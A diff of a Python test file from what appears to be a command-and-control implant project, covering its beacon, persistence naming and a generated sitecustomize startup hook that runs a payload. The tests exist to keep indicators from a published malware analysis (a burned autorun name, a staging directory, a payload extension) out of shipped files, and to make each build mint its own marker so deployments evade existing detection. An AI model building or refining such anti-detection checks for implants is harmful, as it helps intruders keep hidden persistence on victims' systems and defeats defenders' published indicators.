@@ -51,20 +51,65 @@ from unittest import mock
 
 from software.c2 import beacon as beacon_mod
 from software.c2.beacon import Beacon, persistence_name
-from software.c2.server import render_sitecustomize
+from software.c2.stagers.startup_hook import render_sitecustomize
 from software.tests.test_tunnel_config import _GeneratorCase
 
 _REPO = Path(__file__).resolve().parent.parent.parent
 
 # The name that used to be written in every deployment. This file is the
-# only place in `software/` it may appear; the test at the bottom of
-# TestTheAutorunNameComesFromTheBuild is what proves that.
+# only place in the tree it may appear, and
+# `test_the_burned_name_and_the_write_ups_are_in_no_shipped_file` is what
+# proves that.
 _BURNED_NAME = "SystemHealthMonitor"
 
 # What the published write-up names: the original's layout directory, and
-# the extension it gave its payload. A rendered hook that carried either
-# would ship us an indicator somebody else's detection already holds.
-_WRITE_UP_ARTEFACTS = ("cp49s", ".dll")
+# the extension it gave its payload. Carrying either would ship us an
+# indicator somebody else's detection content already holds.
+#
+# They are gated differently, because only one of them can be. The
+# directory is a literal nothing legitimate contains, so it is walked
+# over the whole tree. The extension is not: `beacon.py` loads libcrypto
+# by file name and classifies loot by extension, and `agent/safety.py`
+# matches on `comsvcs.dll`, all of which predate this work and are
+# nothing to do with a payload name. So `.dll` is gated where it would
+# be an indicator of ours -- the rendered hook, the names the generator
+# mints, and every file in the package that renders text onto a target.
+_WRITE_UP_DIR = "cp49s"
+_WRITE_UP_PAYLOAD_EXT = ".dll"
+_WRITE_UP_ARTEFACTS = (_WRITE_UP_DIR, _WRITE_UP_PAYLOAD_EXT)
+
+# Everything in the tree is a deliverable except the material that exists
+# to *discuss* the work: the plan and the design spec, which quote the
+# write-up's artefacts deliberately, this plan's briefs, reports and
+# review diffs, and this file, which asserts their absence and so has to
+# name them. Binary suffixes are skipped because a substring gate over a
+# PNG proves nothing and costs 60 MB of reads.
+_LEAK_SKIP_DIRS = frozenset({".git", "__pycache__", ".superpowers",
+                             ".worktrees", "node_modules"})
+_LEAK_SKIP_SUFFIXES = frozenset({
+    ".png", ".jpg", ".jpeg", ".gif", ".ico", ".pdf", ".zip", ".gz",
+    ".pcap", ".pcapng", ".woff", ".woff2", ".ttf", ".mp4", ".webm",
+    ".step", ".stl", ".pyc",
+})
+_LEAK_SKIP_PREFIXES = (os.path.join("docs", "superpowers"),)
+
+
+def _shipped_files():
+    """Every text file in the tree that is shipped rather than discussed."""
+    here = Path(__file__).resolve()
+    for path in sorted(_REPO.rglob("*")):
+        if not path.is_file() or path.resolve() == here:
+            continue
+        relative = str(path.relative_to(_REPO))
+        if any(part in _LEAK_SKIP_DIRS
+               for part in Path(relative).parts):
+            continue
+        if relative.startswith(_LEAK_SKIP_PREFIXES):
+            continue
+        if path.suffix.lower() in _LEAK_SKIP_SUFFIXES:
+            continue
+        yield relative, path.read_text(encoding="utf-8", errors="ignore")
+
 
 # A plausible generated name, of the shape the server mints. Written here
 # rather than taken from the generator so a generator that stopped
@@ -274,17 +319,33 @@ class TestTheAutorunNameComesFromTheBuild(_PersistenceCase):
         self.assertEqual(first, second)
         self.assertTrue(first)
 
-    def test_the_burned_name_is_in_no_source_file(self):
-        here = Path(__file__).resolve()
+    def test_the_burned_name_and_the_write_ups_are_in_no_shipped_file(self):
+        # Past `software/` and past `*.py`: the generator ships comments
+        # verbatim into the delivered artifact, and a stager template or
+        # a doc is as easy a place to paste one of these as a module.
         offenders = []
-        for path in sorted((_REPO / "software").rglob("*.py")):
-            if path.resolve() == here:
+        for relative, text in _shipped_files():
+            for literal in (_BURNED_NAME, _WRITE_UP_DIR):
+                if literal in text:
+                    offenders.append("%s: %s" % (relative, literal))
+        self.assertEqual(offenders, [],
+                         "a name that was shipped in every deployment, or "
+                         "one the published analysis already names, is in "
+                         "the tree")
+
+    def test_the_stager_package_names_no_payload_of_the_write_ups_kind(self):
+        # Where `.dll` *would* be an indicator of ours: the package whose
+        # text is rendered onto a target.
+        offenders = []
+        for path in sorted((_REPO / "software" / "c2" / "stagers").rglob("*")):
+            if not path.is_file() or path.suffix.lower() in _LEAK_SKIP_SUFFIXES:
                 continue
-            if _BURNED_NAME in path.read_text(encoding="utf-8"):
+            if _WRITE_UP_PAYLOAD_EXT in path.read_text(encoding="utf-8",
+                                                       errors="ignore"):
                 offenders.append(str(path.relative_to(_REPO)))
         self.assertEqual(offenders, [],
-                         "the name that was shipped in every deployment is "
-                         "still in the source")
+                         "the stager package names a payload with the "
+                         "extension the published analysis names")
 
 
 class TestWhatTheEntrysCommandLineCarries(_PersistenceCase):
@@ -432,7 +493,6 @@ class TestTheStartupHook(unittest.TestCase):
     def test_sitecustomize_for_the_path_gate_has_no_argc_check(self):
         text = render_sitecustomize(_PAYLOAD_NAME)
         self.assertNotIn("Py_GetArgcArgv", text)
-        self.assertNotIn("argc", text)
         self.assertNotIn("ctypes", text)
         self.assertIn(_PAYLOAD_NAME, text)
         self.assertIn("run_path", text)
@@ -448,11 +508,17 @@ class TestTheStartupHook(unittest.TestCase):
     def test_the_default_gate_is_path(self):
         self.assertEqual(render_sitecustomize(_PAYLOAD_NAME),
                          render_sitecustomize(_PAYLOAD_NAME, "path"))
+        # The reason, not the word. A docstring that still said which
+        # gate was the default but had lost why would pass a test that
+        # looked for "default" -- and losing the why is exactly how the
+        # next reader comes to flip it.
         doc = render_sitecustomize.__doc__ or ""
-        self.assertIn("argc", doc)
-        self.assertIn("default", doc,
-                      "the docstring does not say which gate is the "
-                      "default, so the next reader will flip it")
+        self.assertIn("unravelled", doc,
+                      "the docstring no longer says that the argc shape "
+                      "is what the published analysis followed")
+        self.assertIn("not an improvement", doc,
+                      "the docstring no longer tells the next reader that "
+                      "flipping the default is not a fix")
 
     def test_rendered_sitecustomize_compiles(self):
         # compile(), never exec(): the hook ends in `runpy.run_path` on
@@ -494,9 +560,14 @@ class TestTheStartupHook(unittest.TestCase):
         # payload instead of the source on stdin -- for ever.
         text = render_sitecustomize(_PAYLOAD_NAME)
         self.assertIn("environ", text)
-        self.assertIn(_PAYLOAD_NAME.split(".")[0].upper(), text,
+        marker = _PAYLOAD_NAME.split(".")[0].upper()
+        self.assertIn(marker, text,
                       "the guard is not derived from this build's payload "
                       "name, so every deployment would share one marker")
+        # And the derivation is real rather than this build's marker
+        # written into the renderer: another build gets another marker.
+        self.assertNotIn(marker, render_sitecustomize("other1234.py"),
+                         "one marker is hardcoded for every build")
 
 
 if __name__ == "__main__":
